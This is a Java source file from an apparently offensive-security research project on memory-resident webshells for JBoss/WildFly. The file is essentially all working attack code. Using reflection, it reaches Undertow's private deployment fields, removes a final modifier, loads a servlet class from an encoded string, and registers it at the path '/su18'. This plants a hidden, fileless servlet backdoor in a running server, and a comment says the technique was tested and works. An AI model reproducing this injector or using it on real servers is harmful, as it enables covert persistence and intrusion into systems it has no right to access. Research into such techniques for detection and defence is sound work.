package org.su18.memshell.test.jboss;

import io.undertow.servlet.api.DeploymentInfo;
import io.undertow.servlet.api.ServletInfo;
import io.undertow.servlet.core.DeploymentImpl;
import io.undertow.servlet.handlers.ServletHandler;
import io.undertow.servlet.spec.ServletRegistrationImpl;
import io.undertow.servlet.util.ConstructorInstanceFactory;

import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Map;

import static org.su18.memshell.test.jboss.DynamicUtils.SERVLET_CLASS_STRING;

/**
 * 来自项目 https://github.com/feihong-cs/memShell
 * 亲测有效
 * 测试版本 JBoss/WildFly 18.0.0.Final
 *
 * @author su18
 */
public class AddJBossServlet extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
		try {
			String servletName = "su18JbossServlet";
			String urlPattern  = "/su18";

			ServletContext context = req.getServletContext();
			Field          f       = context.getClass().getDeclaredField("deploymentInfo");
			f.setAccessible(true);
			DeploymentInfo deploymentInfo = (DeploymentInfo) f.get(context);

			//只添加一次
			Map<String, ServletInfo> servlets = deploymentInfo.getServlets();
			if (!servlets.containsKey(servletName)) {

				Class<? extends Servlet>    clazz       = (Class<? extends Servlet>) DynamicUtils.getClass(SERVLET_CLASS_STRING);
				ServletInfo servletInfo = new ServletInfo(servletName, clazz, new ConstructorInstanceFactory<Servlet>((Constructor<Servlet>) clazz.getDeclaredConstructor()));
				deploymentInfo.addServlet(servletInfo);

				f = context.getClass().getDeclaredField("deployment");
				f.setAccessible(true);
				Field modifiersField = Field.class.getDeclaredField("modifiers");
				modifiersField.setAccessible(true);
				modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
				DeploymentImpl deployment = (DeploymentImpl) f.get(context);
				ServletHandler handler    = deployment.getServlets().addServlet(servletInfo);

				ServletRegistrationImpl registration = new ServletRegistrationImpl(servletInfo, handler.getManagedServlet(), deployment);
				registration.addMapping(urlPattern);

				resp.getWriter().println("jboss wildfly servlet added");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
